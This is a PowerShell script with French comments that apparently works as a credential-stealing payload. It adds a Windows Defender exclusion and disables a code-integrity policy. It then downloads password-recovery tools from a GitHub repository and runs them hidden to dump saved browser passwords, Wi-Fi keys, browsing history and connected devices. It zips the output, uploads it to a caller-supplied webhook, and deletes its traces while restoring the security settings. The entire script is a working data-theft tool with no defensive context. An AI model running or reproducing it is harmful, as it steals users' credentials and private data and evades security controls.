[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$WebhookUrl
)

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null

Add-MpPreference -ExclusionPath $basePath -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Type DWord -Value 0
CiTool --refresh --json

# Téléchargement des exécutables depuis ton GitHub
Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile WirelessKeyView.exe
Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WebBrowserPassView.exe" -OutFile WebBrowserPassView.exe
Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile BrowsingHistoryView.exe
Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile WNetWatcher.exe

# --- EXTRACTION PROPRE DES MOTS DE PASSE & OUTILS ---
# On tente l'exécution directe de WebBrowserPassView
Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/stext $basePath\passwords.txt" -Wait -WindowStyle Hidden

# Exécution des autres outils
Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden

# Attente que les fichiers soient générés
$maxTries = 15
$tries = 0
while (!(Test-Path "passwords.txt") -and ($tries -lt $maxTries)) {
    Start-Sleep -Seconds 1
    $tries++
}

# S'assure que les fichiers existent même si vides pour éviter un blocage
if (!(Test-Path "passwords.txt")) { Set-Content -Path "passwords.txt" -Value "No passwords extracted" }
if (!(Test-Path "wifi.txt")) { Set-Content -Path "wifi.txt" -Value "No wifi keys extracted" }
if (!(Test-Path "history.txt")) { Set-Content -Path "history.txt" -Value "No history extracted" }
if (!(Test-Path "connected_devices.txt")) { Set-Content -Path "connected_devices.txt" -Value "No devices found" }

Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder" -Force
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

if (!(Test-Path $dumpFile)) { exit 1 }

if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
}

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent("Data from $env:USERNAME")), "content")

$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "file", [System.IO.Path]::GetFileName("$dumpFile"))

try { 
    $client.PostAsync($WebhookUrl, $content).Wait() 
} catch {}

$fileStream.Close()
$fileStream.Dispose()

# Nettoyage
Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force scripts
Remove-Item "C:\Users\Public\Documents\ps.ps1"
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents" -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Type DWord -Value 1
CiTool --refresh --json
exit
